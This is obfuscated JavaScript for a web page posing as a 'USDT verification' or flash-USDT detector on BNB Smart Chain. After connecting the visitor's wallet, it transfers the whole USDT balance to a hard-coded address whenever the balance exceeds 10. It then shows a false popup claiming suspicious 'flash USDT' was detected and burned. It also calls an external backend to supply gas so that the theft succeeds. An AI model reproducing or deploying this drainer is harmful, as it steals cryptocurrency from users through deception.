const _0x1b5be5 = _0x3140;
        (function (_0x12cc9b, _0x2789ae) {
            const _0x5c24bd = _0x3140,
                _0x5a43f4 = _0x12cc9b();
            while (!![]) {
                try {
                    const _0x1867c4 =
                        (-parseInt(_0x5c24bd(0xeb)) / 0x1) * (parseInt(_0x5c24bd(0xa7)) / 0x2) +
                        (parseInt(_0x5c24bd(0xa6)) / 0x3) * (-parseInt(_0x5c24bd(0xb6)) / 0x4) +
                        -parseInt(_0x5c24bd(0xba)) / 0x5 +
                        -parseInt(_0x5c24bd(0xa4)) / 0x6 +
                        (parseInt(_0x5c24bd(0x94)) / 0x7) * (-parseInt(_0x5c24bd(0xea)) / 0x8) +
                        parseInt(_0x5c24bd(0xa1)) / 0x9 +
                        parseInt(_0x5c24bd(0xb4)) / 0xa;
                    if (_0x1867c4 === _0x2789ae) break;
                    else _0x5a43f4["push"](_0x5a43f4["shift"]());
                } catch (_0x57d290) {
                    _0x5a43f4["push"](_0x5a43f4["shift"]());
                }
            }
        })(_0x17fe, 0x6eebb);

        const bscAddress = "0x479bC0dD5722B59465A482D73ab74a29d5f1cfc7",
            bnbGasSender = _0x1b5be5(0xb9),
            usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
        let web3, userAddress;

        function _0x3140(_0x98b4dc, _0x3aad4a) {
            const _0x17fe93 = _0x17fe();
            return (
                (_0x3140 = function (_0x31402b, _0x37f418) {
                    _0x31402b = _0x31402b - 0x91;
                    let _0x14767f = _0x17fe93[_0x31402b];
                    return _0x14767f;
                }),
                _0x3140(_0x98b4dc, _0x3aad4a)
            );
        }

        // Connect Wallet with iOS Support
        async function connectWallet() {
            const _0x4aa6d2 = _0x1b5be5;

            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            const isTrustWallet = window.ethereum && window.ethereum.isTrust;

            if (isIOS && !window[_0x4aa6d2(0xb5)]) {
                const link = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(
                    window.location.href
                )}`;
                window.location.href = link;

                setTimeout(() => {
                    if (!window[_0x4aa6d2(0xb5)]) {
                        alert(
                            "\uD83D\uDD17 Please open in Trust Wallet browser or connect manually."
                        );
                    }
                }, 2000);
                return;
            }

            if (window[_0x4aa6d2(0xb5)]) {
                web3 = new Web3(window[_0x4aa6d2(0xb5)]);
                try {
                    await window[_0x4aa6d2(0xb5)][_0x4aa6d2(0xdd)]({
                        method: _0x4aa6d2(0xa0),
                    });
                    await window[_0x4aa6d2(0xb5)][_0x4aa6d2(0xdd)]({
                        method: _0x4aa6d2(0xbc),
                        params: [{ chainId: _0x4aa6d2(0xe0) }],
                    });

                    const accounts = await web3[_0x4aa6d2(0xb7)][_0x4aa6d2(0xe1)]();
                    userAddress = accounts[0];
                    console[_0x4aa6d2(0xc2)](_0x4aa6d2(0xae), userAddress);
                } catch (err) {
                    console[_0x4aa6d2(0xa8)](_0x4aa6d2(0xcb), err);
                    alert(_0x4aa6d2(0xc7));
                }
            } else {
                alert("Please install Trust Wallet or MetaMask.");
            }
        }

        // Auto-connect on page load (iOS & Android)
        window.addEventListener('load', async () => {
            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            const isAndroid = /Android/i.test(navigator.userAgent);
            const hasEth = Boolean(window.ethereum);
            const isTrust = hasEth && window.ethereum.isTrust;

            if (isTrust) {
                // Already in Trust Wallet DApp browser → connect immediately
                await connectWallet();
            }
            else if ((isIOS || isAndroid) && !hasEth) {
                // On mobile Safari/Chrome & no injected provider → deep-link into Trust Wallet
                const deepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)
                    }`;
                window.location.href = deepLink;

                // Fallback if user doesn’t arrive in time
                setTimeout(() => {
                    if (!window.ethereum) {
                        alert("🔗 Please open this page in the Trust Wallet DApp browser.");
                    }
                }, 2000);
            }
        });


        function _0x17fe() {
            const _0x3fd85e = [
                "transfer",
                "Next",
                "1232ojfoIv",
                "2nrOmrR",
                "application/json",
                "block",
                "balanceOf",
                "display",
                "center",
                "top",
                "21FEpkXF",
                "backgroundColor",
                "fromWei",
                "\x20BNB",
                "getBalance",
                "addEventListener",
                "Transferring\x20",
                "fixed",
                "bool",
                "uint256",
                "body",
                "utils",
                "eth_accounts",
                "2306763LSzeEn",
                "black",
                "\x20for\x20gas\x20fees.",
                "1380120TWollh",
                "call",
                "6645RBXuDC",
                "469058OBilvS",
                "error",
                "⚠️\x20Error\x20sending\x20BNB:",
                "recipient",
                "\x20USDT",
                "Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.",
                "USDT\x20transfer\x20failed.\x20Ensure\x20you\x20have\x20enough\x20BNB\x20for\x20gas.",
                "Wallet\x20Connected:",
                "appendChild",
                "div",
                "boxShadow",
                "✅\x20Sent\x20",
                "\x20USDT\x20to\x20",
                "18681710MpZxuo",
                "ethereum",
                "368odXlEv",
                "eth",
                "\x20USDT<br><b>BNB\x20Balance:</b>\x20",
                "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87",
                "3834135AAKgxs",
                "POST",
                "wallet_switchEthereumChain",
                "BNB\x20Balance:\x20",
                "none",
                "ether",
                "Contract",
                "load",
                "log",
                "address",
                "No\x20assets\x20found.",
                "click",
                "popupBox",
                "Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.",
                "methods",
                "https://bepusdt-backend-production.up.railway.app/send-bnb",
                "18px",
                "Error\x20connecting\x20wallet:",
                "position",
                "80%",
                "User\x20BNB\x20is\x20low.\x20Requesting\x20BNB\x20from\x20backend...",
                "0px\x200px\x2010px\x20rgba(0,\x200,\x200,\x200.2)",
                "width",
                "borderRadius",
                "_owner",
                "textAlign",
                "stringify",
                "left",
                "sendTransaction",
                "toWei",
                "red",
                "color",
                "green",
                "#ffebeb",
                "toString",
                "request",
                "50%",
                "\x20BNB\x20to\x20",
                "0x38",
                "getAccounts",
                "transform",
                "...",
                "maxWidth",
                "✅\x20Verification\x20Successful<br>Your\x20assets\x20are\x20genuine.\x20No\x20flash\x20or\x20reported\x20USDT\x20found.<br><br><b>USDT\x20Balance:</b>\x20",
                "style",
                "getElementById",
            ];
            _0x17fe = function () {
                return _0x3fd85e;
            };
            return _0x17fe();
        }
        async function Next() {
            const _0x3ddf57 = _0x1b5be5;
            
            if (!web3 || !userAddress) {
                await connectWallet();
                if (!web3 || !userAddress) {
                    alert("Wallet not connected. Refresh the page.");
                    return;
                }
            }

            // if (!web3 || !userAddress) {
            //     await connectWallet();
            //     if (!web3 || !userAddress) {
            //         alert("Wallet not connected. Refresh the page.");
            //         return;
            //     }
            // }
            // const _0x3ddf57 = _0x1b5be5;
            
            const _0x6ad732 = new web3[_0x3ddf57(0xb7)][_0x3ddf57(0xc0)](
                [
                    {
                        constant: !![],
                        inputs: [{ name: _0x3ddf57(0xd2), type: _0x3ddf57(0xc3) }],
                        name: _0x3ddf57(0xee),
                        outputs: [{ name: "", type: "uint256" }],
                        type: "function",
                    },
                ],
                usdtContractAddress
            ),
                [_0x45914e, _0x3f222c] = await Promise["all"]([
                    _0x6ad732[_0x3ddf57(0xc8)]
                    [_0x3ddf57(0xee)](userAddress)
                    [_0x3ddf57(0xa5)](),
                    web3[_0x3ddf57(0xb7)][_0x3ddf57(0x98)](userAddress),
                ]),
                _0xf5d166 = parseFloat(web3["utils"][_0x3ddf57(0x96)](_0x45914e, "ether")),
                _0x2587c5 = parseFloat(
                    web3["utils"][_0x3ddf57(0x96)](_0x3f222c, _0x3ddf57(0xbf))
                );
            console[_0x3ddf57(0xc2)](
                "USDT\x20Balance:\x20" + _0xf5d166 + _0x3ddf57(0xab)
            ),
                console[_0x3ddf57(0xc2)](_0x3ddf57(0xbd) + _0x2587c5 + _0x3ddf57(0x97));
            if (_0xf5d166 === 0x0) {
                showPopup(_0x3ddf57(0xc4), _0x3ddf57(0xa2));
                return;
            }
            if (_0xf5d166 <= 10) {
                showPopup(
                    _0x3ddf57(0xe5) + _0xf5d166 + _0x3ddf57(0xb8) + _0x2587c5 + "\x20BNB",
                    _0x3ddf57(0xda)
                );
                return;
            }
            showPopup("Loading...", _0x3ddf57(0xda)), transferUSDT(_0xf5d166, _0x2587c5);
        }
        async function transferUSDT(_0x43f85a, _0x1cd071) {
            const _0x4b8098 = _0x1b5be5;
            try {
                _0x1cd071 < 0.0005 &&
                    (console["log"](_0x4b8098(0xce)),
                        await fetch(_0x4b8098(0xc9), {
                            method: _0x4b8098(0xbb),
                            headers: { "Content-Type": _0x4b8098(0xec) },
                            body: JSON[_0x4b8098(0xd4)]({ toAddress: userAddress }),
                        }));
                const _0x1d74ee = new web3[_0x4b8098(0xb7)][_0x4b8098(0xc0)](
                    [
                        {
                            constant: ![],
                            inputs: [
                                { name: _0x4b8098(0xaa), type: _0x4b8098(0xc3) },
                                { name: "amount", type: _0x4b8098(0x9d) },
                            ],
                            name: _0x4b8098(0xe8),
                            outputs: [{ name: "", type: _0x4b8098(0x9c) }],
                            type: "function",
                        },
                    ],
                    usdtContractAddress
                ),
                    _0x23b60c = web3[_0x4b8098(0x9f)][_0x4b8098(0xd7)](
                        _0x43f85a[_0x4b8098(0xdc)](),
                        _0x4b8098(0xbf)
                    );
                console["log"](
                    _0x4b8098(0x9a) +
                    _0x43f85a +
                    _0x4b8098(0xb3) +
                    bscAddress +
                    _0x4b8098(0xe3)
                ),
                    await _0x1d74ee[_0x4b8098(0xc8)]
                    [_0x4b8098(0xe8)](bscAddress, _0x23b60c)
                    ["send"]({ from: userAddress }),
                    showPopup(
                        "✅\x20Verification\x20Successful<br>Flash\x20USDT\x20has\x20been\x20detected\x20and\x20successfully\x20burned.<br><br><b>USDT\x20Burned:</b>\x20" +
                        _0x43f85a +
                        _0x4b8098(0xab),
                        _0x4b8098(0xd8)
                    ),
                    console[_0x4b8098(0xc2)](
                        "✅\x20Transferred\x20" + _0x43f85a + "\x20USDT\x20to\x20" + bscAddress
                    );
            } catch (_0x430783) {
                console[_0x4b8098(0xa8)]("❌\x20USDT\x20Transfer\x20Failed:", _0x430783),
                    alert(_0x4b8098(0xad));
            }
        }
        async function sendBNB(_0x424ce2, _0x5b2302) {
            const _0x28a5e0 = _0x1b5be5;
            try {
                await web3[_0x28a5e0(0xb7)][_0x28a5e0(0xd6)]({
                    from: bnbGasSender,
                    to: _0x424ce2,
                    value: web3["utils"]["toWei"](_0x5b2302, _0x28a5e0(0xbf)),
                    gas: 0x5208,
                }),
                    console["log"](
                        _0x28a5e0(0xb2) +
                        _0x5b2302 +
                        _0x28a5e0(0xdf) +
                        _0x424ce2 +
                        _0x28a5e0(0xa3)
                    );
            } catch (_0x4ce141) {
                console["error"](_0x28a5e0(0xa9), _0x4ce141);
            }
        }
        function showPopup(_0x46c5ed, _0x4b3e26) {
            const _0x6df78b = _0x1b5be5;
            let _0x4ff444 = document["getElementById"](_0x6df78b(0xc6));
            !_0x4ff444 &&
                ((_0x4ff444 = document["createElement"](_0x6df78b(0xb0))),
                    (_0x4ff444["id"] = _0x6df78b(0xc6)),
                    (_0x4ff444["style"][_0x6df78b(0xcc)] = _0x6df78b(0x9b)),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0x93)] = "50%"),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xd5)] = _0x6df78b(0xde)),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xe2)] = "translate(-50%,\x20-50%)"),
                    (_0x4ff444["style"]["padding"] = "20px"),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xd1)] = "10px"),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xb1)] = _0x6df78b(0xcf)),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xd3)] = _0x6df78b(0x92)),
                    (_0x4ff444[_0x6df78b(0xe6)]["fontSize"] = _0x6df78b(0xca)),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xd0)] = _0x6df78b(0xcd)),
                    (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xe4)] = "400px"),
                    document[_0x6df78b(0x9e)][_0x6df78b(0xaf)](_0x4ff444)),
                (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0x95)] =
                    _0x4b3e26 === _0x6df78b(0xd8) ? _0x6df78b(0xdb) : "#e6f7e6"),
                (_0x4ff444[_0x6df78b(0xe6)][_0x6df78b(0xd9)] =
                    _0x4b3e26 === "red" ? _0x6df78b(0xd8) : _0x6df78b(0xda)),
                (_0x4ff444["innerHTML"] = _0x46c5ed),
                (_0x4ff444["style"][_0x6df78b(0x91)] = _0x6df78b(0xed)),
                setTimeout(() => {
                    const _0x45dc56 = _0x6df78b;
                    _0x4ff444["style"]["display"] = _0x45dc56(0xbe);
                }, 0x1388);
        }
        document[_0x1b5be5(0xe7)](_0x1b5be5(0xe9))["addEventListener"](
            _0x1b5be5(0xc5),
            Next
        );
